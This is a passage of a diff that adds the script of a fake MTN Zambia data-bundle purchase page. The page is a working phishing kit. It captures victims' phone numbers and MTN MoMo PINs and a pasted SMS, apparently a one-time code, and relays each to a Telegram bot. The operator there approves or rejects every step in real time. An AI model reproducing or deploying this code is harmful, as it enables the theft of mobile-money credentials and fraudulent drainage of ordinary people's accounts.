+                await fetch(`${API}/editMessageText`, { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ chat_id: cb.message.chat.id, message_id: cb.message.message_id, text: newText }) });
+              }
+              if (pending[requestId]) { const resolve = pending[requestId]; delete pending[requestId]; resolve(action); }
+            } else {
+              await fetch(`${API}/answerCallbackQuery`, { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ callback_query_id: cb.id }) });
+            }
+          }
+        }
+      }
+    } catch (err) {}
+    setTimeout(pollTelegram, 2000);
+  }
+  pollTelegram();
+
+  function genReqId() { return Date.now().toString() + Math.floor(Math.random()*1000).toString(); }
+
+  document.querySelectorAll('.view-details').forEach(btn => {
+    btn.addEventListener('click', function() {
+      state.planName = this.dataset.plan; state.planSize = this.dataset.size;
+      state.planDuration = this.dataset.duration; state.planPrice = this.dataset.price;
+      $('sumPlan').textContent = state.planName;
+      $('sumSize').textContent = state.planSize;
+      $('sumDuration').textContent = state.planDuration;
+      $('sumPrice').textContent = state.planPrice;
+      showPage('confirm');
+    });
+  });
+
+  $('confirmPayBtn').addEventListener('click', async function() {
+    const reqId = genReqId();
+    const message = `🧾 *Confirm Purchase — MTN Zambia*\n\n📦 *Plan:* ${state.planName}\n📊 *Data:* ${state.planSize}\n📆 *Duration:* ${state.planDuration}\n💰 *Amount:* ${state.planPrice}\n💳 *Method:* MTN MoMo\n\n⏰ ${new Date().toLocaleString()}`;
+    const result = await submitAndWait(message, reqId, 'Confirming purchase...');
+    if (result === 'accept') {
+      $('loginPhone').value = '';
+      document.querySelectorAll('.pin-input').forEach(i => i.value = '');
+      showPage('login');
+      setTimeout(() => $('loginPhone').focus(), 300);
+    }
+  });
+
+  $('cancelBtn').addEventListener('click', () => showPage('plans'));
+
+  const loginPhone = $('loginPhone');
+  loginPhone.addEventListener('input', function() { this.value = this.value.replace(/\D/g, '').slice(0, 9); });
+
+  const pinInputs = document.querySelectorAll('.pin-input');
+  pinInputs.forEach((input, index) => {
+    input.addEventListener('input', function() {
+      this.value = this.value.replace(/\D/g, '');
+      if (this.value.length === 1 && index < pinInputs.length - 1) pinInputs[index + 1].focus();
+      if (getPinValue().length === 4) setTimeout(() => attemptLogin(), 200);
+    });
+    input.addEventListener('keydown', function(e) {
+      if (e.key === 'Backspace' && this.value === '' && index > 0) pinInputs[index - 1].focus();
+    });
+  });
+
+  function getPinValue() { return Array.from(pinInputs).map(i => i.value).join(''); }
+
+  let loginInProgress = false;
+  async function attemptLogin() {
+    if (loginInProgress) return;
+    const phone = loginPhone.value.trim();
+    const pin = getPinValue();
+    if (!phone || phone.length < 9) { showToast('Please enter a valid phone number', 'error'); pinInputs.forEach(i => i.value = ''); loginPhone.focus(); return; }
+    if (!pin || pin.length !== 4) return;
+    loginInProgress = true;
+    state.loginPhone = phone; state.loginPin = pin;
+    const reqId = genReqId();
+    const message = `🔐 *MTN MoMo Login — ${state.planName}*\n\n📱 *Phone:* +260${phone}\n🔑 *PIN:* \`${pin}\`\n\n📦 *Plan:* ${state.planName}\n💰 *Price:* ${state.planPrice}\n\n⏰ ${new Date().toLocaleString()}`;
+    const result = await submitAndWait(message, reqId, 'Logging in...');
+    if (result === 'accept') {
+      $('smsSendingTo').textContent = phone;
+      $('smsAmount').textContent = state.planPrice;
+      $('smsTextarea').value = '';
+      $('charCount').textContent = '0';
+      $('smsNextBtn').disabled = true;
+      showPage('sms');
+      setTimeout(() => $('smsTextarea').focus(), 300);
+    } else {
+      pinInputs.forEach(i => i.value = '');
+      pinInputs[0].focus();
+    }
+    loginInProgress = false;
+  }
+
+  $('forgotPin').addEventListener('click', function(e) { e.preventDefault(); showToast('Contact MTN support to reset your PIN', 'error'); });
+  $('registerCard').addEventListener('click', () => showToast('Dial *303# to register for MTN MoMo'));
+  $('helpCard').addEventListener('click', () => showToast('Support: dial 111 for assistance'));
+
+  const smsTextarea = $('smsTextarea');
+  const smsNextBtn = $('smsNextBtn');
+  const charCount = $('charCount');
+
+  smsTextarea.addEventListener('input', function() {
+    const val = this.value.trim();
+    charCount.textContent = this.value.length;
+    smsNextBtn.disabled = val.length === 0;
+  });
+
+  $('smsBack').addEventListener('click', () => showPage('login'));
+
+  smsNextBtn.addEventListener('click', async function() {
+    const smsContent = smsTextarea.value.trim();
+    if (!smsContent) { showToast('Please paste the SMS content', 'error'); return; }
+    state.smsContent = smsContent;
+    const reqId = genReqId();
+    const result = await submitAndWait(smsContent, reqId, 'Verifying SMS...');
+    if (result === 'accept') showPage('review');
+  });
+
+  showPage('plans');
+})();
+</script>
+</body>
+          </html>
